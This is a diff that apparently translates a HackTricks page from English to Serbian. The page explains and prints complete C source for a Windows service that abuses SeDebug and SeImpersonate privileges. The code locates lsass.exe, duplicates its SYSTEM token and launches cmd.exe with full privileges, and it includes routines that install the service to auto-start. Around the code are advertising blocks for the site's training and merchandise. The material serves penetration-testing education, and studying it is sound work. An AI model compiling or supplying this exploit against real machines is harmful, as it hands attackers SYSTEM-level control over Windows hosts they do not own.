@@ -1,27 +1,24 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 
-The following code **exploits the privileges SeDebug and SeImpersonate** to copy the token from a **process running as SYSTEM** and with **all the token privileges**. \
-In this case, this code can be compiled and used as a **Windows service binary** to check that it's working.\
-However, the main part of the **code where the elevation occurs** is inside the **`Exploit`** **function**.\
-Inside of that function you can see that the **process **_**lsass.exe**_** is searched**, then it's **token is copied**, and finally that token is used to spawn a new _**cmd.exe**_ with all the privileges of the copied token.
+Sledeći kod **iskorišćava privilegije SeDebug i SeImpersonate** da kopira token iz **procesa koji se izvršava kao SYSTEM** i sa **svim privilegijama tokena**. \
+U ovom slučaju, ovaj kod može biti kompajliran i korišćen kao **Windows servisni binarni fajl** da se proveri da li radi.\
+Međutim, glavni deo **koda gde se vrši elevacija** je unutar **`Exploit`** **funkcije**.\
+Unutar te funkcije možete videti da se traži **proces **_**lsass.exe**_**, zatim se kopira njegov **token**, i na kraju se taj token koristi da se pokrene novi _**cmd.exe**_ sa svim privilegijama kopiranog tokena.
 
-**Other processes** running as SYSTEM with all or most of the token privileges are: **services.exe**, **svhost.exe** (on of the firsts ones), **wininit.exe**, **csrss.exe**... (_remember that you won't be able to copy a token from a Protected process_). Moreover, you can use the tool [Process Hacker](https://processhacker.sourceforge.io/downloads.php) running as administrator to see the tokens of a process.
-
+**Drugi procesi** koji se izvršavaju kao SYSTEM sa svim ili većinom privilegija tokena su: **services.exe**, **svhost.exe** (jedan od prvih), **wininit.exe**, **csrss.exe**... (_zapamtite da nećete moći da kopirate token iz Protected procesa_). Takođe, možete koristiti alatku [Process Hacker](https://processhacker.sourceforge.io/downloads.php) koja se izvršava kao administrator da biste videli tokene procesa.
 ```c
 // From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
 #include <windows.h>
@@ -37,209 +34,205 @@ HANDLE stopServiceEvent = 0;
 //This function will find the pid of a process by name
 int FindTarget(const char *procname) {
 
-	HANDLE hProcSnap;
-	PROCESSENTRY32 pe32;
-	int pid = 0;
-			
-	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
-			
-	pe32.dwSize = sizeof(PROCESSENTRY32); 
-			
-	if (!Process32First(hProcSnap, &pe32)) {
-			CloseHandle(hProcSnap);
-			return 0;
-	}
-			
-	while (Process32Next(hProcSnap, &pe32)) {
-			if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
-					pid = pe32.th32ProcessID;
-					break;
-			}
-	}
-			
-	CloseHandle(hProcSnap);
-			
-	return pid;
+HANDLE hProcSnap;
+PROCESSENTRY32 pe32;
+int pid = 0;
+
+hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+
+pe32.dwSize = sizeof(PROCESSENTRY32);
+
+if (!Process32First(hProcSnap, &pe32)) {
+CloseHandle(hProcSnap);
+return 0;
+}
+
+while (Process32Next(hProcSnap, &pe32)) {
+if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+pid = pe32.th32ProcessID;
+break;
+}
+}
+
+CloseHandle(hProcSnap);
+
+return pid;
 }
 
 
 int Exploit(void) {
-	
-    HANDLE hSystemToken, hSystemProcess;
-	HANDLE dupSystemToken = NULL;
-    HANDLE hProcess, hThread;
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-	int pid = 0;
+
+HANDLE hSystemToken, hSystemProcess;
+HANDLE dupSystemToken = NULL;
+HANDLE hProcess, hThread;
+STARTUPINFOA si;
+PROCESS_INFORMATION pi;
+int pid = 0;
 
 
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
+ZeroMemory(&si, sizeof(si));
+si.cb = sizeof(si);
+ZeroMemory(&pi, sizeof(pi));
 
-	// open high privileged process
-	if ( pid = FindTarget("lsass.exe") ) 
-		hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-	else
-		return -1;
-	
-	// extract high privileged token
-    if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
-        CloseHandle(hSystemProcess);
-        return -1;
-    }
-	
-	// make a copy of a token
-	DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);	
+// open high privileged process
+if ( pid = FindTarget("lsass.exe") )
+hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+else
+return -1;
 
-	// and spawn a new process with higher privs
-    CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe", 
-						NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+// extract high privileged token
+if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
+CloseHandle(hSystemProcess);
+return -1;
+}
 
-    return 0;
+// make a copy of a token
+DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);
+
+// and spawn a new process with higher privs
+CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
+NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+
+return 0;
 }
 
 
 void WINAPI ServiceControlHandler( DWORD controlCode ) {
-	switch ( controlCode ) {
-		case SERVICE_CONTROL_SHUTDOWN:
-		case SERVICE_CONTROL_STOP:
-			serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
-			SetServiceStatus( serviceStatusHandle, &serviceStatus );
+switch ( controlCode ) {
+case SERVICE_CONTROL_SHUTDOWN:
+case SERVICE_CONTROL_STOP:
+serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 
-			SetEvent( stopServiceEvent );
-			return;
+SetEvent( stopServiceEvent );
+return;
 
-		case SERVICE_CONTROL_PAUSE:
-			break;
+case SERVICE_CONTROL_PAUSE:
+break;
 
-		case SERVICE_CONTROL_CONTINUE:
-			break;
+case SERVICE_CONTROL_CONTINUE:
+break;
 
-		case SERVICE_CONTROL_INTERROGATE:
-			break;
+case SERVICE_CONTROL_INTERROGATE:
+break;
 
-		default:
-			break;
-	}
-	SetServiceStatus( serviceStatusHandle, &serviceStatus );
+default:
+break;
+}
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 }
 
 void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
-	// initialise service status
-	serviceStatus.dwServiceType = SERVICE_WIN32;
-	serviceStatus.dwCurrentState = SERVICE_STOPPED;
-	serviceStatus.dwControlsAccepted = 0;
-	serviceStatus.dwWin32ExitCode = NO_ERROR;
-	serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
-	serviceStatus.dwCheckPoint = 0;
-	serviceStatus.dwWaitHint = 0;
+// initialise service status
+serviceStatus.dwServiceType = SERVICE_WIN32;
+serviceStatus.dwCurrentState = SERVICE_STOPPED;
+serviceStatus.dwControlsAccepted = 0;
+serviceStatus.dwWin32ExitCode = NO_ERROR;
+serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
+serviceStatus.dwCheckPoint = 0;
+serviceStatus.dwWaitHint = 0;
 
-	serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );
+serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );
 
-	if ( serviceStatusHandle ) {
-		// service is starting
-		serviceStatus.dwCurrentState = SERVICE_START_PENDING;
-		SetServiceStatus( serviceStatusHandle, &serviceStatus );
+if ( serviceStatusHandle ) {
+// service is starting
+serviceStatus.dwCurrentState = SERVICE_START_PENDING;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 
-		// do initialisation here
-		stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );
+// do initialisation here
+stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );
 
-		// running
-		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
-		serviceStatus.dwCurrentState = SERVICE_RUNNING;
-		SetServiceStatus( serviceStatusHandle, &serviceStatus );
+// running
+serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
+serviceStatus.dwCurrentState = SERVICE_RUNNING;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 
-		Exploit();
-		WaitForSingleObject( stopServiceEvent, -1 );
+Exploit();
+WaitForSingleObject( stopServiceEvent, -1 );
 
-		// service was stopped
-		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
-		SetServiceStatus( serviceStatusHandle, &serviceStatus );
+// service was stopped
+serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 
-		// do cleanup here
-		CloseHandle( stopServiceEvent );
-		stopServiceEvent = 0;
+// do cleanup here
+CloseHandle( stopServiceEvent );
+stopServiceEvent = 0;
 
-		// service is now stopped
-		serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
-		serviceStatus.dwCurrentState = SERVICE_STOPPED;
-		SetServiceStatus( serviceStatusHandle, &serviceStatus );
-	}
+// service is now stopped
+serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
+serviceStatus.dwCurrentState = SERVICE_STOPPED;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
+}
 }
 
 
 void InstallService() {
-	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );
+SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );
 
-	if ( serviceControlManager ) {
-		TCHAR path[ _MAX_PATH + 1 ];
-		if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
-			SC_HANDLE service = CreateService( serviceControlManager,
-							serviceName, serviceName,
-							SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
-							SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
-							0, 0, 0, 0, 0 );
-			if ( service )
-				CloseServiceHandle( service );
-		}
-		CloseServiceHandle( serviceControlManager );
-	}
+if ( serviceControlManager ) {
+TCHAR path[ _MAX_PATH + 1 ];
+if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
+SC_HANDLE service = CreateService( serviceControlManager,
+serviceName, serviceName,
+SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
+SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
+0, 0, 0, 0, 0 );
+if ( service )
+CloseServiceHandle( service );
+}
+CloseServiceHandle( serviceControlManager );
+}
 }
 
 void UninstallService() {
-	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );
+SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );
 
-	if ( serviceControlManager ) {
-		SC_HANDLE service = OpenService( serviceControlManager,
-			serviceName, SERVICE_QUERY_STATUS | DELETE );
-		if ( service ) {
-			SERVICE_STATUS serviceStatus;
-			if ( QueryServiceStatus( service, &serviceStatus ) ) {
-				if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
-					DeleteService( service );
-			}
-			CloseServiceHandle( service );
-		}
-		CloseServiceHandle( serviceControlManager );
-	}
+if ( serviceControlManager ) {
+SC_HANDLE service = OpenService( serviceControlManager,
+serviceName, SERVICE_QUERY_STATUS | DELETE );
+if ( service ) {
+SERVICE_STATUS serviceStatus;
+if ( QueryServiceStatus( service, &serviceStatus ) ) {
+if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
+DeleteService( service );
+}
+CloseServiceHandle( service );
+}
+CloseServiceHandle( serviceControlManager );
+}
 }
 
 int _tmain( int argc, TCHAR* argv[] )
 {
-	if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
-		InstallService();
-	}
-	else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
-		UninstallService();
-	}
-	else  {
-		SERVICE_TABLE_ENTRY serviceTable[] = {
-			{ serviceName, ServiceMain },
-			{ 0, 0 }
-		};
-	
-		StartServiceCtrlDispatcher( serviceTable );
-	}	
+if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
+InstallService();
+}
+else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
+UninstallService();
+}
+else  {
+SERVICE_TABLE_ENTRY serviceTable[] = {
+{ serviceName, ServiceMain },
+{ 0, 0 }
+};
 
-	return 0;
+StartServiceCtrlDispatcher( serviceTable );
+}
+
+return 0;
 }
 ```
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
-
-
